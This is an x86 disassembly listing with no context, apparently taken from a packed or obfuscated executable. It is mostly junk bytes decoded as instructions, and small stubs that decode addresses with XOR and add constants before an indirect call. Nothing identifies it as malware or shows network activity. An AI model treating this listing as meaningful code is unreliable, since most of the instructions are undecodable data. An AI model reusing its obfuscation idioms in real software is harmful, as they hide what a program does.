  412270:	cmp    BYTE PTR [ebx],dh
  412272:	or     eax,0xe0885c22
  412277:	jno    0x4122e7
  412279:	aas    
  41227a:	pushf  
  41227b:	rcr    ebx,cl
  41227d:	pop    ebx
  41227e:	(bad)  
  41227f:	jo     0x4122bc
  412281:	fld    QWORD PTR [edx-0x76]
  412284:	inc    eax
  412285:	lods   al,BYTE PTR ds:[esi]
  412286:	cmp    DWORD PTR [eax],eax
  412288:	xlat   BYTE PTR ds:[ebx]
  412289:	and    al,BYTE PTR [eax+0x1c]
  41228c:	scas   al,BYTE PTR es:[edi]
  41228d:	xchg   DWORD PTR [edx],ebx
  41228f:	outs   dx,DWORD PTR ds:[esi]
  412290:	pop    ds
  412291:	sub    BYTE PTR [eax-0x15095865],bl
  412297:	ret    0x1b8c
  41229a:	loopne 0x412265
  41229c:	leave  
  41229d:	jae    0x412252
  41229f:	rol    BYTE PTR [edx],cl
  4122a1:	mov    esi,0xff352302
  4122a6:	dec    esp
  4122a7:	add    BYTE PTR [ebp+0x4c],ch
  4122aa:	add    dl,ch
  4122ac:	sbb    BYTE PTR [eax+ecx*1-0x2f],bh
  4122b0:	adc    eax,DWORD PTR [ecx+0x6d]
  4122b3:	hlt    
  4122b4:	mov    DWORD PTR [ebp+0xc],eax
  4122b7:	mov    eax,DWORD PTR [ebp-0x4]
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx-0x6c96ec13],ch
  4122ef:	fidiv  DWORD PTR [edi]
  4122f1:	jle    0x41234f
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x4122e1
  4122fa:	data16 sub ch,ch
  4122fd:	(bad)  
  4122fe:	fistp  QWORD PTR [ebx]
  412300:	addr16 mov ebx,0x2ba26d1a
  412306:	jg     0x412342
  412308:	lock pop esi
  41230a:	jnp    0x4122ae
  41230c:	adc    bl,BYTE PTR [esi]
  41230e:	into   
  41230f:	mov    ds:0xedd11fb4,eax
  412314:	pop    esi
  412315:	jp     0x41231f
  412317:	cmp    BYTE PTR [ebx-0x5e],0xbe
  41231b:	pop    esi
  41231c:	lds    ebx,FWORD PTR [ebx-0x5b]
  41231f:	jmp    0x6e0663d7
  412324:	adc    DWORD PTR [ecx+0x35],0x3e
  412328:	sbb    ebp,DWORD PTR [eax]
  41232a:	into   
  41232b:	inc    eax
  41232c:	fwait
  41232d:	loopne 0x41237b
  41232f:	xchg   BYTE PTR [esi-0x3a],cl
  412332:	out    0xb5,al
  412334:	pop    edi
  412335:	sbb    eax,0xc1efa93d
  41233a:	jne    0x412384
  41233c:	jmp    0xaa4c0bd0
  412341:	fist   DWORD PTR [ecx-0x20]
  412344:	std    
  412345:	ss jmp 0x412302
  412348:	fs push edi
  41234a:	rcl    DWORD PTR [esi-0x44],cl
  41234d:	dec    esi
  41234e:	jne    0x4122fa
  412350:	push   ss
  412351:	sbb    eax,0x499eed6c
  412356:	push   0xffffffaa
  412358:	js     0x412387
  41235a:	sbb    BYTE PTR [ebp+0x15],dl
  41235d:	xor    edx,esi
  41235f:	sbb    eax,DWORD PTR [eax]
  412361:	xor    ebx,DWORD PTR [eax]
  412363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412364:	ss sub dl,dh
  412367:	retf   0x9d77
  41236a:	push   ebp
  41236b:	xor    BYTE PTR [ebx+0x1157ce64],bl
  412371:	(bad)  
  412372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412373:	inc    esp
  412374:	out    dx,al
  412375:	test   DWORD PTR [eax+0x7a33bcfb],edx
  41237b:	pop    ebx
  41237c:	xchg   ebp,eax
  41237d:	mov    ebp,0x4847c7a3
  412382:	sub    BYTE PTR [edi+0x259045fe],ah
  412388:	sbb    BYTE PTR [edi],dh
  41238a:	(bad)  
  41238b:	sub    eax,0xc4b543b3
  412390:	int    0x9b
  412392:	not    DWORD PTR [edi+esi*1]
  412395:	ins    BYTE PTR es:[edi],dx
  412396:	mov    edx,0x5955a2cd
  41239b:	neg    BYTE PTR [esi+0x0]
  41239e:	div    ebx
  4123a0:	mov    al,0xfc
  4123a2:	inc    edx
  4123a3:	adc    BYTE PTR [edi+0x5034efe],al
  4123a9:	or     eax,DWORD PTR [ebp-0x6]
  4123ac:	sbb    al,0xf8
  4123ae:	sbb    al,0xb7
  4123b0:	dec    ebp
  4123b1:	pop    esp
  4123b2:	dec    eax
  4123b3:	cmp    al,0x8c
  4123b5:	fbstp  TBYTE PTR [ecx+0x4a6c8834]
  4123bb:	add    eax,0x1e95bf52
  4123c0:	or     al,0x38
  4123c2:	and    WORD PTR [ecx-0x1],di
  4123c6:	jbe    0x4123e4
  4123c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123c9:	ins    DWORD PTR es:[edi],dx
  4123ca:	les    ebx,FWORD PTR [eax]
  4123cc:	inc    ebx
  4123cd:	push   edi
  4123ce:	mov    bl,0xeb
  4123d0:	sub    BYTE PTR [eax+edi*1-0x11],bl
  4123d4:	loope  0x41237d
  4123d6:	out    0xef,al
  4123d8:	jp     0x41243c
  4123da:	dec    eax
  4123db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123dc:	aas    
  4123dd:	jl     0x412419
  4123df:	pop    edx
  4123e0:	mov    eax,0x62c9d337
  4123e5:	inc    ebp
  4123e6:	in     eax,dx
  4123e7:	ins    BYTE PTR es:[edi],dx
  4123e8:	mov    ds:0xf12be70f,al
  4123ed:	adc    ebx,edi
  4123ef:	pop    eax
  4123f0:	scas   al,BYTE PTR es:[edi]
  4123f1:	mov    ecx,0xefba08ba
  4123f6:	inc    esp
  4123f7:	call   0x472b0cdc
  4123fc:	push   esp
  4123fd:	pop    esi
  4123fe:	shr    eax,0xf6
  412401:	(bad)  
  412402:	pop    ebp
  412403:	hlt    
  412404:	cwde   
  412405:	popf   
  412406:	push   0x57d6b704
  41240b:	lods   eax,DWORD PTR ds:[esi]
  41240c:	mov    ds:0x9e034b31,eax
  412411:	pop    esi
  412412:	lds    ebp,FWORD PTR [ecx]
  412414:	xor    BYTE PTR ds:0xbfa98c56,dh
  41241a:	inc    esi
  41241b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41241c:	std    
  41241d:	jo     0x412423
  41241f:	mov    eax,ds:0x40fac5b3
  412424:	jns    0x4123e3
  412426:	popa   
  412427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412428:	nop
  412429:	out    dx,al
  41242a:	pop    ds
  41242b:	adc    edx,DWORD PTR [ecx+0x7c1552d7]
  412431:	or     bl,BYTE PTR [ecx+0x3d]
  412434:	pop    esi
  412435:	pushf  
  412436:	imul   edi,edx,0xbc7e4157
  41243c:	ret    0x13d8
  41243f:	daa    
  412440:	in     al,0x61
  412442:	pop    es
  412443:	inc    ebp
  412444:	stos   BYTE PTR es:[edi],al
  412445:	jle    0x41241e
  412447:	xor    al,0x76
  412449:	ss jmp 0x41240a
  41244c:	es ret 0x278c
  412450:	call   0xd4c9d318
  412455:	cmp    bl,bl
  412457:	pop    ss
  412458:	sbb    DWORD PTR [edx],ecx
  41245a:	out    dx,al
  41245b:	(bad)
  41245e:	aas    
  41245f:	fwait
  412460:	gs pop ecx
  412462:	xchg   edi,eax
  412463:	cli    
  412464:	jae    0x412442
  412466:	push   cs
  412467:	jns    0x41248d
  412469:	dec    ecx
  41246a:	popa   
  41246b:	mov    DWORD PTR [eax-0x31],esi
  41246e:	add    BYTE PTR [edi],0x81
  412471:	iret   
  412472:	out    0x95,eax
  412474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412475:	(bad)  
  412476:	and    edi,esi
  412478:	fdiv   DWORD PTR [eax+0x59ffdae7]
  41247e:	mov    cl,0xaa
  412480:	mov    eax,0x71db740c
  412485:	mov    ebx,0x2b766dd4
  41248a:	push   ebp
  41248b:	popf   
  41248c:	push   eax
  41248d:	lds    esi,FWORD PTR [ebx+0x39306249]
  412493:	inc    edi
  412494:	dec    ebp
  412495:	es push edx
  412497:	mov    dh,0xd5
  412499:	push   0x2c
  41249b:	arpl   WORD PTR [eax+edx*4-0x46b7e95f],cx
  4124a2:	push   esp
  4124a3:	sub    al,0x58
  4124a5:	jbe    0x41248b
  4124a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a8:	les    ebp,FWORD PTR [ebp-0x7d07e9bb]
  4124ae:	inc    esi
  4124af:	cmp    al,0xc2
  4124b1:	pop    ss
  4124b2:	mov    edi,0x6b42e70
  4124b7:	jl     0x4124f9
  4124b9:	jl     0x4124c6
  4124bb:	ss mov edi,0x625a1b4c
  4124c1:	fstp   TBYTE PTR [ebp-0x44b83a4c]
  4124c7:	add    BYTE PTR [ecx+0x2edacccb],cl
  4124cd:	and    DWORD PTR [edi-0x24b1666f],ecx
  4124d3:	sbb    bh,BYTE PTR [ebx+0xc0f7b1]
  4124d9:	aaa    
  4124da:	nop
  4124db:	adc    eax,0x89084503
  4124e0:	inc    ebp
  4124e1:	lock mov eax,DWORD PTR [ebp-0x1c]
  4124e5:	test   eax,eax
  4124e7:	je     0x4129b7
  4124ed:	mov    DWORD PTR [ebp-0x24],esi
  4124f0:	push   0xb
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	mov    al,0xaa
  4125a0:	aam    0x2f
  4125a2:	pop    ecx
  4125a3:	pop    ebp
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x412608
  4125ab:	sub    dh,BYTE PTR [esi]
  4125ad:	and    edi,DWORD PTR [ebx]
  4125af:	(bad)  
  4125b0:	in     eax,0x72
  4125b2:	jne    0x4125f2
  4125b4:	jo     0x4125d9
  4125b6:	or     al,0xc
  4125b8:	dec    ecx
  4125b9:	(bad)  
  4125ba:	jl     0x412579
  4125bc:	mov    cl,0x33
  4125be:	push   ds
  4125bf:	add    eax,DWORD PTR [eax]
  4125c1:	je     0x412634
  4125c3:	pop    ss
  4125c4:	test   al,0xfe
  4125c6:	mov    ds:0x20e36c49,al
  4125cb:	mov    eax,ds:0x9d267c8f
  4125d0:	idiv   BYTE PTR [esi-0x28ec8d09]
  4125d6:	sbb    BYTE PTR ds:0xfb88e788,cl
  4125dc:	(bad)  
  4125dd:	repz xor dl,BYTE PTR [ebp-0x7b]
  4125e1:	fcomp  QWORD PTR [edx-0x65ba9c58]
  4125e7:	xchg   ebx,eax
  4125e8:	shl    BYTE PTR [eax],0xa2
  4125eb:	jmp    0x772c:0xd8115563
  4125f2:	and    al,0x86
  4125f4:	(bad)  
  4125f5:	cld    
  4125f6:	xor    ch,bh
  4125f8:	std    
  4125f9:	imul   ebx,ebx,0xc0d32e6d
  4125ff:	cmp    edx,ebp
  412601:	and    BYTE PTR [eax],al
  412603:	cmp    ecx,DWORD PTR [eax+edx*8-0x4b]
  412607:	xor    al,0x4f
  412609:	fstp   DWORD PTR [ecx+eiz*2]
  41260c:	nop
  41260d:	jmp    0x8eac:0x23b13743
  412614:	xchg   ecx,eax
  412615:	xchg   esp,eax
  412616:	das    
  412617:	push   cs
  412618:	mov    al,0x49
  41261a:	(bad)  
  41261b:	sbb    eax,0x1c4a63e7
  412620:	lods   eax,DWORD PTR ds:[esi]
  412621:	or     eax,0xfdecebc1
  412626:	fldcw  WORD PTR ds:0xe03d71fb
  41262c:	std    
  41262d:	pop    edx
  41262e:	mov    edi,DWORD PTR ds:0xac877916
  412634:	sbb    eax,0xb30d15f9
  412639:	jp     0x41267c
  41263b:	mov    ecx,0x378f5a88
  412640:	jo     0x412692
  412642:	push   es
  412643:	iret   
  412644:	test   esi,ebp
  412646:	sub    edx,edi
  412648:	sbb    al,0xac
  41264a:	push   edi
  41264b:	mov    eax,0xe3ba301f
  412650:	dec    ebp
  412651:	cs daa 
  412653:	xchg   BYTE PTR ds:0xbdbc02c9,dl
  412659:	cdq    
  41265a:	sahf   
  41265b:	push   eax
  41265c:	loop   0x41266e
  41265e:	fsub   DWORD PTR [edx]
  412660:	mov    ch,0x3b
  412662:	xchg   esi,eax
  412663:	sub    eax,0xe1477bb3
  412668:	daa    
  412669:	daa    
  41266a:	cli    
  41266b:	les    edi,FWORD PTR [ebx+eax*4]
  41266e:	and    BYTE PTR [ecx],bh
  412670:	xchg   esp,eax
  412671:	das    
  412672:	sbb    DWORD PTR [ebp+0x2737c315],eax
  412678:	bound  esi,QWORD PTR ds:0x9b366e21
  41267e:	repnz xchg edi,edi
  412681:	xlat   BYTE PTR ds:[ebx]
  412682:	jecxz  0x4126a6
  412684:	cli    
  412685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412686:	into   
  412687:	xchg   esi,eax
  412688:	xchg   ecx,eax
  412689:	cdq    
  41268a:	jno    0x412707
  41268c:	shl    DWORD PTR [ebp+0x3cd60bbe],0xbf
  412693:	sub    ch,BYTE PTR [edi+eax*1]
  412696:	push   esp
  412697:	adc    DWORD PTR [ebp-0x78],0x4b
  41269b:	stc    
  41269c:	imul   eax,DWORD PTR [edi-0x3e3b2509],0xffffffa2
  4126a3:	adc    bh,bl
  4126a5:	inc    dh
  4126a7:	jg     0x412725
  4126a9:	cmp    al,0x7f
  4126ab:	and    eax,0xe00356a
  4126b0:	stos   DWORD PTR es:[edi],eax
  4126b1:	xchg   edi,eax
  4126b2:	or     bl,BYTE PTR [edx-0x2772ace4]
  4126b8:	adc    ah,BYTE PTR [eax-0x20dd872d]
  4126be:	enter  0x1e81,0xbf
  4126c2:	xchg   ebp,eax
  4126c3:	sub    al,0xd3
  4126c5:	inc    ebp
  4126c6:	pushf  
  4126c7:	call   0xaa44c3eb
  4126cc:	adc    eax,DWORD PTR [ebp+0x1e]
  4126cf:	fdiv   st,st(6)
  4126d1:	mov    fs,WORD PTR [ebx+0x41c70ccb]
  4126d7:	retf   0x5886
  4126da:	arpl   bp,sp
  4126dc:	(bad)  
  4126dd:	push   ebx
  4126de:	icebp  
  4126df:	(bad)  
  4126e1:	test   DWORD PTR [esi+edi*4],eax
  4126e4:	push   esi
  4126e5:	addr16 (bad) 
  4126e7:	shl    al,cl
  4126e9:	int    0xc3
  4126eb:	call   0x85a3a2bf
  4126f0:	mov    BYTE PTR [eax+0x6ae466a6],ah
  4126f6:	jmp    0x412695
  4126f8:	into   
  4126f9:	scas   al,BYTE PTR es:[edi]
  4126fa:	add    eax,0x36b900fb
  4126ff:	sub    BYTE PTR [ecx],0xcb
  412702:	shl    edx,0x63
  412705:	sbb    eax,DWORD PTR [eax+eax*1]
  412708:	mov    ebp,0xdbc05636
  41270d:	ins    DWORD PTR es:[edi],dx
  41270e:	or     al,0x16
  412710:	retf   
  412711:	lods   al,BYTE PTR ds:[esi]
  412712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412713:	mov    cl,0xdf
  412715:	cmp    bl,BYTE PTR [edi]
  412717:	frstor [esi+0x4435205]
  41271d:	mov    eax,ecx
  41271f:	test   DWORD PTR [ebx-0x7b],edx
  412722:	pop    ebx
  412723:	adc    al,0xd9
  412725:	jo     0x41272b
  412727:	push   edx
  412728:	shl    BYTE PTR [eax],cl
  41272a:	ins    BYTE PTR es:[edi],dx
  41272b:	test   BYTE PTR [eax+0x1ed987cb],ch
  412731:	or     al,0x48
  412733:	pop    ds
  412734:	dec    esp
  412735:	arpl   WORD PTR [eax+0x42],sp
  412738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412739:	fcmovu st,st(4)
  41273b:	retf   0xab14
  41273e:	fcmovnbe st,st(2)
  412740:	mov    dl,ah
  412742:	and    ebp,DWORD PTR [ebp+0x75860b68]
  412748:	stc    
  412749:	dec    ebp
  41274a:	lods   eax,DWORD PTR ds:[esi]
  41274b:	cmp    eax,0x1e2903ba
  412750:	or     dl,bh
  412752:	popa   
  412753:	out    dx,eax
  412754:	icebp  
  412755:	cmp    ecx,DWORD PTR [ebp-0x7253582d]
  41275b:	sbb    al,0x15
  41275d:	std    
  41275e:	dec    edi
  41275f:	xlat   BYTE PTR ds:[ebx]
  412760:	mov    cl,0x1
  412762:	and    ch,bl
  412764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412765:	and    ecx,DWORD PTR [ecx+0x2e]
  412768:	(bad)  
  412769:	lahf   
  41276a:	adc    dh,ah
  41276c:	or     al,0x49
  41276e:	(bad)  
  41276f:	mov    ss,eax
  412771:	add    BYTE PTR [ebx],dh
  412773:	ins    BYTE PTR es:[edi],dx
  412774:	xchg   edx,eax
  412775:	hlt    
  412776:	cmp    edi,0x20c1551b
  41277c:	adc    al,0xeb
  41277e:	xchg   edx,eax
  41277f:	shr    DWORD PTR [ecx],1
  412781:	std    
  412782:	jae    0x412714
  412784:	(bad)  
  412785:	out    dx,al
  412786:	addr16 jl 0x412761
  412789:	xchg   esp,eax
  41278a:	pop    ebp
  41278b:	test   eax,0xe9c1332d
  412790:	sti    
  412791:	add    DWORD PTR [eax],eax
  412793:	add    BYTE PTR [edi],dh
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	out    0x56,al
  4127a2:	cli    
  4127a3:	call   0x7f59:0x7e7e5f44
  4127aa:	jle    0x41282a
  4127ac:	adc    eax,0x62efc9b
  4127b1:	pop    es
  4127b2:	inc    esp
  4127b3:	cmp    al,BYTE PTR [ebp-0x15]
  4127b6:	cld    
  4127b7:	xchg   esp,eax
  4127b8:	push   ds
  4127b9:	pop    ebx
  4127ba:	je     0x41282b
  4127bc:	div    DWORD PTR [ecx+0x4badc12e]
  4127c2:	mov    al,0x22
  4127c4:	push   0x993c63c5
  4127c9:	adc    al,0xc7
  4127cb:	cmp    ecx,DWORD PTR [edx-0x8]
  4127ce:	dec    eax
  4127cf:	xchg   BYTE PTR [edi+0x7797b211],al
  4127d5:	stc    
  4127d6:	and    eax,0xbf7be09e
  4127db:	and    bl,BYTE PTR [edi+0x5d9a8fb3]
  4127e1:	es mov edx,gs
  4127e4:	mov    esp,0xb33b7cc2
  4127e9:	jle    0x412795
  4127eb:	xor    esi,DWORD PTR [ebx+0x77]
  4127ee:	aad    0xa6
  4127f0:	stos   DWORD PTR es:[edi],eax
  4127f1:	scas   eax,DWORD PTR es:[edi]
  4127f2:	ins    BYTE PTR es:[edi],dx
  4127f3:	xor    ebx,ecx
  4127f5:	jecxz  0x4127d9
  4127f7:	jno    0x412845
  4127f9:	sub    ch,bh
  4127fb:	mov    al,BYTE PTR [ebp+0x72]
  4127fe:	add    BYTE PTR [ebx+0xf37a4cc],al
  412804:	clc    
  412805:	mov    ah,0x19
  412807:	and    ah,BYTE PTR [eax-0x19]
  41280a:	pop    ds
  41280b:	push   0x1e
  41280d:	fcomip st,st(4)
  41280f:	loopne 0x412850
  412811:	jl     0x41281b
  412813:	mov    eax,0x73b7921d
  412818:	repnz push edx
  41281a:	rol    BYTE PTR [eax+0x2df6ad0b],1
  412820:	mov    al,ds:0x1a1af444
  412825:	xchg   esi,eax
  412826:	popf   
  412827:	sub    esi,DWORD PTR [ebx-0x683e3bbc]
  41282d:	sbb    al,0x77
  41282f:	inc    eax
  412830:	push   ds
  412831:	dec    esi
  412832:	and    al,0x55
  412834:	jmp    DWORD PTR [esi]
  412836:	mov    cl,0xd2
  412839:	loop   0x412831
  41283b:	test   BYTE PTR [ecx+0x76],bh
  41283e:	inc    ecx
  41283f:	inc    edi
  412840:	stos   BYTE PTR es:[edi],al
  412841:	mov    ebp,DWORD PTR [eax+0x2a]
  412844:	mov    dh,0x5c
  412846:	sub    eax,0x5895d007
  41284b:	jp     0x412864
  41284d:	out    0xd2,al
  41284f:	cmp    ecx,DWORD PTR [esi]
  412851:	jp     0x412877
  412853:	in     al,dx
  412854:	or     bl,BYTE PTR [ebx-0x1]
  412857:	dec    edi
  412858:	int    0x7c
  41285a:	pop    ds
  41285b:	xchg   esi,eax
  41285c:	sahf   
  41285d:	fwait
  41285e:	cmp    eax,0x1e765fbb
  412863:	popa   
  412864:	scas   eax,DWORD PTR es:[edi]
  412865:	imul   eax,DWORD PTR [edi-0x4daf216f],0xbcbaa3ba
  41286f:	rcl    DWORD PTR [ebp+0x7],1
  412872:	fild   DWORD PTR [ebx+edi*1]
  412875:	and    DWORD PTR [ecx-0x32],esp
  412878:	pop    edi
  412879:	push   0x46225489
  41287e:	inc    edx
  41287f:	ret    
  412880:	cmp    al,0xe8
  412882:	or     al,BYTE PTR [ebx+eax*4+0x7e061d52]
  412889:	repnz hlt 
  41288b:	sbb    BYTE PTR [ebx-0x41],0x40
  41288f:	ja     0x4128bd
  412891:	aad    0x99
  412893:	mov    WORD PTR [ebx*1-0x5be071c8],ds
  41289a:	ins    BYTE PTR es:[edi],dx
  41289b:	clc    
  41289c:	fwait
  41289d:	imul   esi,esi,0xe66a07fb
  4128a3:	sub    esp,DWORD PTR [ebx]
  4128a5:	mov    edi,0x20a06579
  4128aa:	hlt    
  4128ab:	inc    ebp
  4128ac:	popf   
  4128ad:	pop    ebp
  4128ae:	ss out 0x47,eax
  4128b1:	addr16 cli 
  4128b3:	jno    0x41292e
  4128b5:	rcr    BYTE PTR [edx+0x30],0xcf
  4128b9:	inc    ecx
  4128ba:	lods   al,BYTE PTR ds:[esi]
  4128bb:	add    DWORD PTR [ebx-0x1f9c9316],esi
  4128c1:	out    0xff,eax
  4128c3:	jl     0x41286b
  4128c5:	(bad)  
  4128c6:	mov    ah,0xe2
  4128c8:	ds repz cmp al,0xd8
  4128cc:	out    0x40,eax
  4128ce:	sti    
  4128cf:	popa   
  4128d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d1:	push   ebp
  4128d2:	push   ss
  4128d3:	adc    BYTE PTR [edi+edx*4-0x6b],dh
  4128d7:	and    dh,BYTE PTR [ebp+0x16]
  4128da:	aas    
  4128db:	sub    esp,DWORD PTR [esi+0x7b97876e]
  4128e1:	push   ecx
  4128e2:	test   DWORD PTR [ebp+0x5dfd7719],esp
  4128e8:	pop    esp
  4128e9:	pop    esi
  4128ea:	(bad)  
  4128eb:	jmp    0xa2d9a713
  4128f0:	cmp    DWORD PTR [edx+0x325ab08e],0x6c
  4128f7:	or     BYTE PTR ds:[esi],ah
  4128fa:	inc    esi
  4128fb:	mov    WORD PTR [ebp+0x4def6e4a],?
  412901:	mov    ds,WORD PTR [ecx]
  412903:	repnz push edi
  412905:	inc    edi
  412906:	ret    0x67a3
  412909:	addr16 mov ds:0x246b,eax
  41290d:	jo     0x4128f5
  41290f:	and    BYTE PTR [eax],dh
  412911:	daa    
  412912:	mov    DWORD PTR [eax+0x7c],esi
  412915:	jl     0x41298d
  412917:	mov    dl,0xa7
  412919:	push   ss
  41291a:	pop    ebx
  41291b:	jae    0x412982
  41291d:	mov    ah,0x1f
  41291f:	inc    esp
  412920:	shl    dh,1
  412922:	cwde   
  412923:	test   al,ah
  412925:	push   ebx
  412926:	jae    0x4128fb
  412928:	scas   eax,DWORD PTR es:[edi]
  412929:	mov    WORD PTR ds:[eax],ss
  41292c:	push   eax
  41292d:	mov    ebx,0xb758a9d
  412932:	sbb    BYTE PTR [ebp+0x3c0a5a0d],al
  412938:	ficomp DWORD PTR [ebp-0x2b]
  41293b:	fsubr  QWORD PTR [edi-0x72e81406]
  412941:	cmp    ebx,DWORD PTR [eax]
  412943:	mov    bh,0x84
  412945:	cld    
  412946:	in     eax,0x29
  412948:	jp     0x41292d
  41294a:	jno    0x4129a8
  41294c:	lock adc ecx,DWORD PTR [esi+0x37]
  412950:	shl    cl,1
  412952:	gs sbb al,0x4b
  412955:	pop    ebp
  412956:	out    0x37,eax
  412958:	xor    edx,DWORD PTR [ebx]
  41295a:	fisub  WORD PTR [eax-0x7fd1785f]
  412960:	int3   
  412961:	retf   
  412962:	jp     0x412999
  412964:	bound  edi,QWORD PTR [ebx-0x6e]
  412967:	pop    esi
  412968:	loope  0x412964
  41296a:	jg     0x4129a7
  41296c:	in     al,0x70
  41296e:	or     DWORD PTR [esp+eiz*2+0x1a],ecx
  412972:	sub    esi,DWORD PTR ds:0xf9289133
  412978:	(bad)  
  41297a:	dec    esp
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	(bad)  
  41297e:	mov    ch,0xc
  412980:	xor    bl,BYTE PTR [esi]
  412982:	into   
  412983:	es out dx,eax
  412985:	cmp    al,0x3f
  412987:	mov    edi,0x48223e6c
  41298c:	dec    ax
  41298e:	mov    edx,0xaf0fc603
  412993:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fadd   DWORD PTR [edx-0x58a2676e]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a19
  4129fb:	cdq    
  4129fc:	cmp    bh,BYTE PTR [esi]
  4129fe:	jmp    0x4129be
  412a00:	mov    dh,0xe6
  412a02:	ret    0x6013
  412a05:	scas   eax,DWORD PTR es:[edi]
  412a06:	mov    eax,ds:0x27ee3166
  412a0b:	mov    fs:0x4172a2c9,eax
  412a11:	aad    0xc5
  412a13:	jnp    0x412a3a
  412a15:	outs   dx,BYTE PTR ds:[esi]
  412a16:	xor    eax,0xa648272
  412a1b:	sbb    edx,DWORD PTR [edx+ebp*8+0x32]
  412a1f:	setno  BYTE PTR [edi-0x1f9db11a]
  412a26:	outs   dx,BYTE PTR ds:[esi]
  412a27:	adc    eax,0xe209386e
  412a2c:	cmp    al,0xb6
  412a2e:	add    al,0x8e
  412a30:	fsubr  DWORD PTR [ecx+edx*2-0x21]
